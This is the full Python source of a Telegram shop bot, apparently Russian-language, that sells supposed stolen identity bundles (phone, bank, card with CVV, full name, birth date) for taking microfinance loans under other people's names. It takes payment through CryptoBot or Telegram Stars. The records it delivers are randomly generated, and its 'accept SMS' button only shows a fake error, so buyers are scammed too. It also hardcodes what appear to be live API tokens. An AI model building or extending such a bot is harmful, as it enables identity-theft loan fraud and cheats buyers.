import asyncio
import logging
import math
import os
import random
import sqlite3
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, types
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import CommandStart
from aiogram.types import (
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    LabeledPrice,
    PreCheckoutQuery,
    ReplyKeyboardMarkup,
)

BOT_TOKEN = "9299564954:AAFkJuuDQsOqIZN2kCN6O9olTbl99BBN7jc"
CRYPTO_BOT_TOKEN = "682011:AAfI8LdFjYJoTTPj096gX3QcmDp2IsMiF3s"
SUPPORT_USERNAME = "@griidy"
CHAT_USERNAME = "@Q3_Quad"
CATALOG_VIDEO_PATH = "IMG_8194_3.MP4"
USDT_RUB_RATE = 95.0
STAR_RUB_RATE = 1.50

BASE_PRODUCT_DESCRIPTION = (
    "Вы получаете строку в таком формате:\n"
    "Телефон;банк;карта;ФИО;дата рождения.\n\n"
    "⚠️ Замена делается только в случае не погашенного займа / не валид документов;карты;моб.телефона\n\n"
    "Инструкция:\n"
    "При входе в лк мфо не нужно менять данные просто возьмите займ от 50к как постоянный клиент"
)

db_connection = sqlite3.connect("q3_shop.db")
db_cursor = db_connection.cursor()

db_cursor.execute("""
CREATE TABLE IF NOT EXISTS products (
    id TEXT PRIMARY KEY,
    name TEXT,
    price INTEGER,
    stock INTEGER,
    description TEXT
)
""")

db_cursor.execute("""
CREATE TABLE IF NOT EXISTS purchases (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    product_name TEXT,
    price INTEGER,
    account_data TEXT,
    created_at TEXT
)
""")
db_connection.commit()

INITIAL_PRODUCTS = [
    ("mfo_1", "Турбо займ + Эква займ", 5478, 81, BASE_PRODUCT_DESCRIPTION),
    ("mfo_2", "Быстро деньги + Лайм Займ", 4984, 142, BASE_PRODUCT_DESCRIPTION),
    ("mfo_3", "Money Man + Аденьги", 5300, 293, BASE_PRODUCT_DESCRIPTION),
]

for item_id, item_name, item_price, item_stock, item_desc in INITIAL_PRODUCTS:
    db_cursor.execute(
        "INSERT OR IGNORE INTO products (id, name, price, stock, description) VALUES (?, ?, ?, ?, ?)",
        (item_id, item_name, item_price, item_stock, item_desc),
    )
    db_cursor.execute(
        "UPDATE products SET name = ?, description = ? WHERE id = ?",
        (item_name, item_desc, item_id),
    )
db_connection.commit()

LAST_NAMES = [
    "Соколов", "Морозов", "Волков", "Лебедев", "Козлов", "Новиков",
    "Беляев", "Тарасов", "Белов", "Комаров", "Орлов", "Киселев",
    "Макаров", "Андреев", "Ковалев", "Ильин", "Гусев", "Титов",
]
FIRST_NAMES = [
    "Артем", "Максим", "Дмитрий", "Кирилл", "Егор", "Илья",
    "Никита", "Роман", "Тимур", "Даниил", "Станислав", "Глеб",
    "Вадим", "Денис", "Руслан", "Арсений", "Ярослав", "Виктор",
]
MIDDLE_NAMES = [
    "Александрович", "Дмитриевич", "Максимович", "Сергеевич",
    "Андреевич", "Алексеевич", "Артемович", "Игоревич",
    "Олегович", "Павлович", "Романович", "Денисович",
]
BANKS = [
    "Т-Банк", "Сбербанк", "Альфа-Банк", "ВТБ", "Райффайзенбанк",
    "Газпромбанк", "Озон Банк", "Яндекс Банк", "Совкомбанк",
]
AREA_CODES = ["913", "916", "926", "903", "905", "950", "961", "985", "999"]


def calc_stars_amount(price_rub: int) -> int:
    return math.ceil(price_rub / STAR_RUB_RATE)


def build_account_record() -> str:
    phone_str = (
        f"+7 {random.choice(AREA_CODES)} "
        f"{random.randint(100, 999)} "
        f"{random.randint(10, 99)} "
        f"{random.randint(10, 99)}"
    )
    bank_name = random.choice(BANKS)
    card_digits = (
        f"2200 {random.randint(1000, 9999)} "
        f"{random.randint(1000, 9999)} {random.randint(1000, 9999)}"
    )
    exp_month = f"{random.randint(1, 12):02d}"
    exp_year = random.randint(27, 33)
    cvv_code = f"{random.randint(100, 999)}"
    card_block = f"{card_digits} {exp_month}/{exp_year} {cvv_code}"

    full_name = (
        f"{random.choice(LAST_NAMES)} "
        f"{random.choice(FIRST_NAMES)} {random.choice(MIDDLE_NAMES)}"
    )

    birth_day = f"{random.randint(2, 27):02d}"
    birth_month = f"{random.randint(2, 11):02d}"
    birth_year = random.randint(1979, 2002)
    birth_date = f"{birth_day}.{birth_month}.{birth_year}"

    return f"{phone_str};{bank_name};{card_block};{full_name};{birth_date}"


def complete_order(user_id: int, item_id: str) -> tuple[str, int, str] | None:
    db_cursor.execute("SELECT name, price, stock FROM products WHERE id = ?", (item_id,))
    item = db_cursor.fetchone()
    if not item or item[2] <= 0:
        return None

    title, price, stock = item
    db_cursor.execute("UPDATE products SET stock = ? WHERE id = ?", (stock - 1, item_id))

    delivered_record = build_account_record()
    timestamp = datetime.now().strftime("%d.%m.%Y %H:%M")

    db_cursor.execute(
        "INSERT INTO purchases (user_id, product_name, price, account_data, created_at) VALUES (?, ?, ?, ?, ?)",
        (user_id, title, price, delivered_record, timestamp),
    )
    db_connection.commit()
    return title, price, delivered_record


async def safe_edit_text(
    message: types.Message,
    text: str,
    reply_markup: InlineKeyboardMarkup | None = None,
    parse_mode: str | None = None,
):
    try:
        await message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except TelegramBadRequest as exc:
        if "message is not modified" not in str(exc):
            raise


async def create_cryptobot_invoice(amount_rub: int, title: str):
    usdt_amount = round(amount_rub / USDT_RUB_RATE, 2)
    endpoint = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    body = {
        "asset": "USDT",
        "amount": str(usdt_amount),
        "description": title,
        "allow_comments": False,
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(endpoint, json=body, headers=headers) as resp:
                payload = await resp.json()
                if resp.status == 200 and payload.get("ok"):
                    return (
                        str(payload["result"]["invoice_id"]),
                        payload["result"]["bot_invoice_url"],
                    )
                print(f"[CryptoBot Create Error] HTTP {resp.status}: {payload}")
    except aiohttp.ClientError as exc:
        logging.error("CryptoBot request failed: %s", exc)
    return None, None


async def verify_cryptobot_invoice(invoice_id: str) -> bool:
    endpoint = "https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    params = {"invoice_ids": invoice_id}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint, params=params, headers=headers) as resp:
                payload = await resp.json()
                if resp.status == 200 and payload.get("ok") and payload["result"]["items"]:
                    return payload["result"]["items"][0]["status"] == "paid"
                print(f"[CryptoBot Check Error] HTTP {resp.status}: {payload}")
    except aiohttp.ClientError as exc:
        logging.error("CryptoBot status check failed: %s", exc)
    return False


def build_main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🛍 Магазин")],
            [KeyboardButton(text="📜 История покупок"), KeyboardButton(text="🆘 Поддержка")],
        ],
        resize_keyboard=True,
    )


def build_catalog_keyboard() -> InlineKeyboardMarkup:
    db_cursor.execute("SELECT id, name, price FROM products")
    items = db_cursor.fetchall()
    rows = [
        [InlineKeyboardButton(text=f"{title} | {price}₽", callback_data=f"item_{item_id}")]
        for item_id, title, price in items
    ]
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def build_item_keyboard(item_id: str, price: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💳 Купить за {price}₽", callback_data=f"checkout_{item_id}")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="go_catalog")],
        ]
    )


def build_gateways_keyboard(item_id: str, price: int) -> InlineKeyboardMarkup:
    stars_count = calc_stars_amount(price)
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=f"💎 Crypto Bot ({price}₽)",
                    callback_data=f"invoice_cb_{item_id}",
                )
            ],
            [
                InlineKeyboardButton(
                    text=f"⭐️ Звезды ({stars_count} ⭐️)",
                    callback_data=f"invoice_stars_{item_id}",
                )
            ],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"item_{item_id}")],
        ]
    )


def build_after_pay_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📩 Принять СМС", callback_data="sms_stub")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="go_catalog")],
        ]
    )


tg_bot = Bot(token=BOT_TOKEN)
tg_dp = Dispatcher()


def build_welcome_text() -> str:
    return (
        "Добро Пожаловать в Q3 Shop ⚡️\n\n"
        "Магазин - каталог товаров 🛍\n"
        f"Поддержка - {SUPPORT_USERNAME} 🛠\n"
        f"Наш чат - {CHAT_USERNAME} 💬\n\n"
        "Магазин Мфошечек ждет вас 💼\n"
        "Удачных покупок 🍀"
    )


async def send_catalog_message(message: types.Message):
    if os.path.exists(CATALOG_VIDEO_PATH):
        await message.answer_video(
            video=FSInputFile(CATALOG_VIDEO_PATH),
            caption="Каталог",
        )
    await message.answer("Каталог", reply_markup=build_catalog_keyboard())


@tg_dp.message(CommandStart())
async def handle_start(message: types.Message):
    await message.answer(build_welcome_text(), reply_markup=build_main_keyboard())


@tg_dp.message(F.text == "🛍 Магазин")
async def handle_shop_button(message: types.Message):
    await send_catalog_message(message)


@tg_dp.message(F.text == "📜 История покупок")
async def handle_history_button(message: types.Message):
    db_cursor.execute(
        "SELECT product_name, price, account_data, created_at FROM purchases WHERE user_id = ? ORDER BY id DESC",
        (message.from_user.id,),
    )
    records = db_cursor.fetchall()
    if not records:
        await message.answer("У вас пока нет покупок.", reply_markup=build_main_keyboard())
        return

    lines = ["📜 <b>История покупок:</b>\n"]
    for title, price, record_str, stamp in records:
        lines.append(f"▪️ <b>{title}</b> ({price}₽) — <i>{stamp}</i>\n<code>{record_str}</code>\n")
    await message.answer("\n".join(lines), parse_mode="HTML", reply_markup=build_main_keyboard())


@tg_dp.message(F.text == "🆘 Поддержка")
async def handle_support_button(message: types.Message):
    await message.answer(f"Поддержка: {SUPPORT_USERNAME}", reply_markup=build_main_keyboard())


@tg_dp.callback_query(F.data == "go_home")
async def callback_go_home(callback: types.CallbackQuery):
    await callback.message.delete()
    await callback.message.answer(build_welcome_text(), reply_markup=build_main_keyboard())
    await callback.answer()


@tg_dp.callback_query(F.data == "go_catalog")
async def callback_go_catalog(callback: types.CallbackQuery):
    await safe_edit_text(callback.message, "Каталог", reply_markup=build_catalog_keyboard())
    await callback.answer()


@tg_dp.callback_query(F.data.startswith("item_"))
async def callback_item_card(callback: types.CallbackQuery):
    item_id = callback.data.split("_", 1)[1]
    db_cursor.execute(
        "SELECT name, price, stock, description FROM products WHERE id = ?",
        (item_id,),
    )
    item = db_cursor.fetchone()
    if not item:
        await callback.answer("Позиция не найдена.", show_alert=True)
        return

    title, price, stock, desc = item
    card_text = (
        f"<b>{title}</b>\n\n"
        f"{price}₽\n"
        f"📦 {stock} шт\n"
        f"📋 Описание\n"
        f"{desc}"
    )
    await safe_edit_text(
        callback.message,
        card_text,
        parse_mode="HTML",
        reply_markup=build_item_keyboard(item_id, price),
    )
    await callback.answer()


@tg_dp.callback_query(F.data.startswith("checkout_"))
async def callback_checkout(callback: types.CallbackQuery):
    item_id = callback.data.split("_", 1)[1]
    db_cursor.execute("SELECT name, price, stock FROM products WHERE id = ?", (item_id,))
    item = db_cursor.fetchone()
    if not item:
        await callback.answer("Позиция не найдена.", show_alert=True)
        return

    title, price, stock = item
    if stock <= 0:
        await callback.answer("Товар закончился.", show_alert=True)
        return

    stars_count = calc_stars_amount(price)
    await safe_edit_text(
        callback.message,
        f"Позиция: <b>{title}</b>\n"
        f"К оплате: <b>{price}₽</b> / <b>{stars_count} ⭐️</b> (курс 1 ⭐️ = {STAR_RUB_RATE:.2f} ₽)\n\n"
        f"Выберите способ оплаты:",
        parse_mode="HTML",
        reply_markup=build_gateways_keyboard(item_id, price),
    )
    await callback.answer()


@tg_dp.callback_query(F.data.startswith("invoice_cb_"))
async def callback_create_cryptobot_invoice(callback: types.CallbackQuery):
    item_id = callback.data.split("invoice_cb_", 1)[1]
    db_cursor.execute("SELECT name, price, stock FROM products WHERE id = ?", (item_id,))
    item = db_cursor.fetchone()
    if not item:
        await callback.answer("Ошибка позиции.", show_alert=True)
        return

    title, price, stock = item
    if stock <= 0:
        await callback.answer("Товар закончился.", show_alert=True)
        return

    await callback.answer("Создаю чек...")
    invoice_id, pay_link = await create_cryptobot_invoice(price, title)

    if not pay_link:
        await safe_edit_text(
            callback.message,
            "Не удалось создать чек в Crypto Bot. Проверьте токен и логи в консоли IDLE.",
            reply_markup=build_gateways_keyboard(item_id, price),
        )
        return

    invoice_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🔗 Оплатить {price}₽ (Crypto Bot)", url=pay_link)],
            [
                InlineKeyboardButton(
                    text="✅ Проверить оплату",
                    callback_data=f"verify_cb_{item_id}_{invoice_id}",
                )
            ],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"checkout_{item_id}")],
        ]
    )

    await safe_edit_text(
        callback.message,
        f"Чек <b>Crypto Bot</b> создан.\n\n"
        f"Позиция: <b>{title}</b>\n"
        f"Сумма: <b>{price}₽</b> (~{round(price / USDT_RUB_RATE, 2)} USDT)\n\n"
        f"Перейдите по ссылке для оплаты и нажмите «Проверить оплату».",
        parse_mode="HTML",
        reply_markup=invoice_kb,
    )


@tg_dp.callback_query(F.data.startswith("verify_cb_"))
async def callback_verify_cryptobot(callback: types.CallbackQuery):
    _, _, item_id, invoice_id = callback.data.split("_", 3)
    is_paid = await verify_cryptobot_invoice(invoice_id)

    if not is_paid:
        await callback.answer("Оплата еще не поступила.", show_alert=True)
        return

    order = complete_order(callback.from_user.id, item_id)
    if not order:
        await callback.answer("Товар закончился.", show_alert=True)
        return

    title, _, delivered_record = order
    await safe_edit_text(
        callback.message,
        f"Оплата подтверждена.\n\n"
        f"Позиция: <b>{title}</b>\n"
        f"<code>{delivered_record}</code>",
        parse_mode="HTML",
        reply_markup=build_after_pay_keyboard(),
    )
    await callback.answer()


@tg_dp.callback_query(F.data.startswith("invoice_stars_"))
async def callback_create_stars_invoice(callback: types.CallbackQuery):
    item_id = callback.data.split("invoice_stars_", 1)[1]
    db_cursor.execute("SELECT name, price, stock FROM products WHERE id = ?", (item_id,))
    item = db_cursor.fetchone()
    if not item:
        await callback.answer("Ошибка позиции.", show_alert=True)
        return

    title, price, stock = item
    if stock <= 0:
        await callback.answer("Товар закончился.", show_alert=True)
        return

    stars_count = calc_stars_amount(price)
    await callback.answer()
    await callback.message.answer_invoice(
        title=title,
        description=f"Покупка позиции {title} ({price}₽)",
        payload=f"stars_order:{item_id}",
        currency="XTR",
        prices=[LabeledPrice(label=title, amount=stars_count)],
    )


@tg_dp.pre_checkout_query()
async def handle_pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)


@tg_dp.message(F.successful_payment)
async def handle_successful_stars_payment(message: types.Message):
    payload_str = message.successful_payment.invoice_payload
    if not payload_str.startswith("stars_order:"):
        return

    item_id = payload_str.split(":", 1)[1]
    order = complete_order(message.from_user.id, item_id)
    if not order:
        await message.answer(
            f"Оплата прошла, но товар закончился. Обратитесь в поддержку: {SUPPORT_USERNAME}",
            reply_markup=build_main_keyboard(),
        )
        return

    title, _, delivered_record = order
    await message.answer(
        f"Оплата звёздами подтверждена.\n\n"
        f"Позиция: <b>{title}</b>\n"
        f"<code>{delivered_record}</code>",
        parse_mode="HTML",
        reply_markup=build_after_pay_keyboard(),
    )


@tg_dp.callback_query(F.data == "sms_stub")
async def callback_sms_stub(callback: types.CallbackQuery):
    await callback.answer(
        "Упс кажется что то сламалось обратитесь в поддержку",
        show_alert=True,
    )


async def run_bot():
    logging.basicConfig(level=logging.INFO)
    await tg_bot.delete_webhook(drop_pending_updates=True)
    await tg_dp.start_polling(tg_bot)


if __name__ == "__main__":
    try:
        asyncio.run(run_bot())
    except RuntimeError:
        active_loop = asyncio.get_event_loop()
        active_loop.run_until_complete(run_bot())

